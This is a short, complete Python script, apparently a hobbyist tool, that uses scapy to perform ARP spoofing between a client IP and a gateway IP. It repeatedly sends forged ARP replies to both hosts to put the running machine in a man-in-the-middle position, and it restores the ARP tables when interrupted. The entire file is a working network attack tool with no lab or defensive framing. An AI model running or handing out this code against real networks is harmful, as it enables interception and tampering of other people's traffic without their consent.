import scapy.all as scapy
import time
import argparse

def get_args():
    parse = argparse.ArgumentParser()
    parse.add_argument("-c", "--client", dest="client_ip", help="Enter client IP Address.")
    parse.add_argument("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP Address")
    return parse.parse_args()

def get_mac_address(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    make_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = make_broadcast / arp_request
    requests_answered = scapy.srp(arp_request_broadcast, timeout=1, retry=3, verbose=False)[0]
    return requests_answered[0][1].hwsrc

def arp_spoof(dest_ip, spoof_ip):
    dest_mac = get_mac_address(dest_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore_network(dest_ip, src_ip):
    dest_mac = get_mac_address(dest_ip)
    src_mac = get_mac_address(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_args()
client_ip = options.client_ip
gateway_ip = options.gateway_ip
packet_counter = 0
try:
    while True:
        arp_spoof(client_ip, gateway_ip)
        arp_spoof(gateway_ip, client_ip)
        packet_counter = packet_counter + 2
        print("\rPackets sent: " + str(packet_counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nQuit command detected.... Restoring ARP Tables... Please wait\n")
    restore_network(client_ip, gateway_ip)
    restore_network(gateway_ip, client_ip)
